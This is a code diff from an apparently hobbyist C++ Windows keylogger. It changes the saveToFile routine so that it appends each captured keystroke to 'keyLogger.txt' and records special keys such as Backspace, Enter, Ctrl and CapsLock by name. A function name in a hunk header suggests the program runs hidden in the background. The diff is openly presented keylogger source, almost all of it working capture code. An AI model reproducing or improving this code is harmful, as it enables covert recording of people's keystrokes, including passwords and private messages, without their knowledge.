@@ -1,4 +1,4 @@
-#include <windows.h>
+#include <Windows.h>
 #include <fstream>
 #include <conio.h>
 
@@ -30,19 +30,53 @@ void createBackgroundProcess(void) {
 void saveToFile(int key) {
 	std::ofstream out("keyLogger.txt", std::ios::out | std::ios::app);
 
-	//int res = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
-
 	// interval of mouse keys
 	if (key >= 1 && key <= 6) {
 		return;
 	}
 
-	//Capital or not
+	switch (key) {
+	case VK_BACK:
+		out << "Backspace";
+		break;
+	case VK_TAB:
+		out << "Tab";
+		break;
+	case VK_CLEAR:
+		out << "ClearKey";
+		break;
+	case VK_RETURN:
+		out << "Enter";
+		break;
+	case VK_SHIFT:
+		out << "Shift";
+		break;
+	case VK_CONTROL:
+		out << "Ctrl";
+		break;
+	case VK_MENU:
+		out << "Alt";
+		break;
+	case VK_CAPITAL:
+		out << "CapsLock";
+		break;
+	case VK_ESCAPE:
+		out << "Esc";
+		break;
+	case VK_PAUSE:
+		out << "Pause";
+		break;
+	default:
+		out << (char)std::tolower(key);
+		break;
+	}
+	/*
 	if (GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT)) {
-		out << (char)key;
-	} else {
+		out << "Shift";
+	}
+	else {
 		out << (char)std::tolower(key);
 	}
-
+	*/
 	out.close();
 }
